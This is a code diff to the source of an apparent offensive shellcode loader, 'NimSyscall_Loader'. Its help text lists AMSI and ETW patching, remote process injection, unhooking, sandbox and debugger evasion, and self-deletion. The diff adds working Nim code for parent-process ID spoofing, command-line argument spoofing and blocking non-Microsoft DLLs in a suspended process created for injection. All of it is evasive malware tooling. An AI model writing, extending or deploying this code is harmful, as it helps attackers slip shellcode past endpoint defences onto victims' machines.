@@ -63,7 +63,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.7
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --noRES --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --clone=<dllToClone> --cpl --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --noRES --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --clone=<dllToClone> --cpl --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -153,6 +153,9 @@ Options:
       --customprocess procname    Spawn a custom process (instead of notepad) for remote injection
       --remoteprocess procname    Injects into the specified (existing) remote process name, e.g. teams.exe. The loader searches for the first process with that name
                          Can be used for multiple process names, e.g. --remoteprocess=teams.exe,iexplore.exe,MicrosoftEdge.exe -> First try teams, else Internet Explorer, last Edge
+      --spoofArgs ArgstoSpoof    Spoof the arguments of the process to inject into
+      --parentProcess parentProcName    Name of the parent Process to spoof (PPID Spoofing)
+      --blockDLLs    Set the DllBlocklistPolicy to 1 to prevent DLLs from being loaded
       --remotepatchAMSI    Patch AMSI in the remote process before shellcode execution
       --remotepatchETW    Patch ETW in the remote process before shellcode execution
       --remoteMapSection    Map the shellcode into the remote process via MapViewOfSection -> decryption will happen AFTER writing the Shellcode into the remote process
@@ -198,6 +201,8 @@ var
     targetdomain : string = ""
     processname: string = ""
     customspawnprocess: string = "RuntimeBroker.exe"
+    parentProcess: string = ""
+    spoofArgs: string = ""
     shellcodeFile: seq[string] = @["enc.blob"]
     scfile: string = ""
     retrieveFromFile: bool = false
@@ -222,6 +227,7 @@ var
     localinject: bool = true
     unhook: bool = false
     verbose: bool = false
+    blockDLLs: bool = false
     denim: bool = false
     llvm: bool = false
     gosleep: bool = false
@@ -411,9 +417,20 @@ if args["--sleep-in-between"]:
 if args["--remoteinject"]:
   localinject = false
 
+if args["--blockDLLs"]:
+    blockDLLs = true
+
 if args["--customprocess"]:
   let customprocargs = args["--customprocess"]
   customspawnprocess = fmt"{customprocargs}"
+
+if args["--spoofArgs"]:
+  let customSpoofArgs = args["--spoofArgs"]
+  spoofArgs = fmt"{customSpoofArgs}"
+
+if args["--parentProcess"]:
+    let parProc = args["--parentProcess"]
+    parentProcess = fmt"{parProc}"
 
 if args["--remoteprocess"]:
   let remoteprocessesstring = args["--remoteprocess"]
@@ -1263,11 +1280,113 @@ SleepyCryptLoop(10000)
 """
 
 let NotepadProcIDStub * = fmt"""
-import osproc
-# Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
-let tProcess = startProcess(obf("{customspawnprocess}"))
-tProcess.suspend() # That's handy!
-tProcess.close()
+import os
+
+from winim import PROCESSENTRY32,PROCESSENTRY32A,Process32NextA,Process32FirstA,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS
+
+proc FindPidByName * (processName : string):DWORD =
+    try:
+        var 
+            entry : PROCESSENTRY32A
+            snapshot : HANDLE
+            pid : DWORD = 0
+        snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+        if snapshot != INVALID_HANDLE_VALUE:
+            entry.dwSize = DWORD(sizeof(PROCESSENTRY32))
+            if Process32FirstA(snapshot,addr entry):
+                while Process32NextA(snapshot,addr entry):
+                    pid = entry.th32ProcessID
+                    if ($(entry.szExeFile).join()).contains(processName):
+                        result = pid
+    except: 
+        echo obf("Process ID not found")
+
+var remoteProcID: DWORD
+
+proc StartProcess(): void =
+    var 
+        lpSize: SIZE_T
+        tProcess: HANDLE
+        pi: PROCESS_INFORMATION
+        ps: SECURITY_ATTRIBUTES
+        si: STARTUPINFOEX
+        status: WINBOOL
+        tHandle: HANDLE
+        tProcPath: WideCString
+        ts: SECURITY_ATTRIBUTES
+    
+    ps.nLength = sizeof(ps).cint
+    ts.nLength = sizeof(ts).cint
+    si.StartupInfo.cb = sizeof(si).cint
+
+
+    when defined spoof_args:
+        tProcPath = newWideCString(joinPath(r"C:\Windows\System32", obf("{customspawnprocess}")) & " " & obf("{spoofArgs}"))
+    else:
+        tProcPath = newWideCString(joinPath(r"C:\Windows\System32", obf("{customspawnprocess}")))
+
+    when defined(blockDLLs) or (obf("{parentProcess}") != ""):
+        InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
+        si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))
+        InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)
+
+        when defined(blockDLLs):
+            const
+                PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x00000001 shl 44
+            var
+                policy: DWORD64
+
+            policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
+            
+            status = UpdateProcThreadAttribute(
+                si.lpAttributeList,
+                0,
+                cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
+                addr policy,
+                sizeof(policy),
+                NULL,
+                NULL)
+
+        if (obf("{parentProcess}") != ""):
+            var
+                ppHandle: HANDLE
+                ppid: DWORD
+
+            ppid = FindPidByName(obf("{parentProcess}"))                    
+            ppHandle = OpenProcess(PROCESS_ALL_ACCESS,false, ppid)
+            
+            if (ppHandle == 0):
+              when defined(verbose):
+                echo obf("Failed to open parent process handle, no permissions??")
+              ppHandle = HANDLE(-1) # Current Process
+
+            status = UpdateProcThreadAttribute(
+                si.lpAttributeList,
+                0,
+                cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
+                addr ppHandle,
+                sizeof(ppHandle),
+                NULL,
+                NULL)
+
+    status = CreateProcess(
+        NULL,
+        tProcPath,
+        ps,
+        ts, 
+        FALSE,
+        EXTENDED_STARTUPINFO_PRESENT or CREATE_SUSPENDED,
+        NULL,
+        r"C:\Windows\system32\",
+        addr si.StartupInfo,
+        addr pi)
+
+    tProcess = pi.hProcess
+    remoteProcID = pi.dwProcessId
+    tHandle = pi.hThread
+
+StartProcess()
+
 
 when defined(verbose):
     echo obf("[*] Sleeping in between for: "), {sleepinbetween}
@@ -1276,8 +1395,8 @@ when defined(sleepinbetween):
     HowMuchTimeWouldYouLikeToSleep({sleepinbetween})
 
 when defined(verbose):
-    echo obf("[*] Target Process: "), tProcess.processID
-var remoteProcID = DWORD(tProcess.processID)
+    echo obf("[*] Target Process: "), remoteProcID
+
 
 """
 
@@ -1674,6 +1793,9 @@ if(callbackexecute):
 if(wait):
     basicCompileFlags.add("-d:wait ")
 
+if(blockDLLs):
+    basicCompileFlags.add("-d:blockDLLs ")
+
 if (retrieveFromURL):
     if(shellcodeURL.contains("https")):
         basicCompileFlags.add("-d:ssl ")
@@ -1723,6 +1845,9 @@ if (wow64):
 
 if not noDInvoke:
     basicCompileFlags.add("-d:DInvoke ")
+
+if (spoofArgs != ""):
+    basicCompileFlags.add(fmt"-d:spoof_args ")
 
 if (sleepinbetween > 0):
     basicCompileFlags.add(fmt"-d:sleepinbetween ")
